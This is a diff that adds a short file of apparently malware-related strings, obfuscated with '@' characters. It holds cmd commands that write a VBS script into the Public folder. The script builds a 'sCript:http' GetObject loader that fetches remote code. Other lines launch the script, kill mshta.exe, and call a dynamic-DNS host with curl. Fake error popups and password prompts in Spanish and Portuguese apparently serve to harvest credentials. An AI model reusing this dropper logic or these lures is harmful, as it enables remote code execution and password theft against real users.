@@ -1,0 +1,17 @@
+192.168.0.24/vb/
+W@scr@Ipt.s@hEl@l
+RUN
+cm@d /V/D/c "echo %varC2%="tp":%varC5%="ri">%Public%\%varC7%.v@bs&&echo '%varC8%%varC9%>>%Public%\%varC7%.vbs&&echo %varC1%=".":%varC4%="sC" ^& %varC5% ^& "pt:ht" ^& %varC2% ^& "://">>%Public%\%varC7%.v@bs"
+Popup
+Error (cod %srand%)
+cm@d /V/D/c start %public%\\%varC7%.v@bs
+Introduce la contrasena
+Contrasena
+close
+cm@d /c TAS@KKILL /F /IM ms@hta.e@xe
+c@md /c curl -X GET "https://dw9.dns04.com/w2/index.php"
+cm@d /V/D/c echo|set /p=^"%varC4%^=%varC4% ^& ^"%link%":GetO">>%Public%\\%varC7%.vbs&echo|set /p=^"bject(^">>%Public%\\%varC7%.vbs
+c@md /V/D/c "echo _>>%Public%\\%varC7%.vbs&&echo %varC4%)>>%Public%\\%varC7%.vbs"
+Digite a senha
+Senha
+3
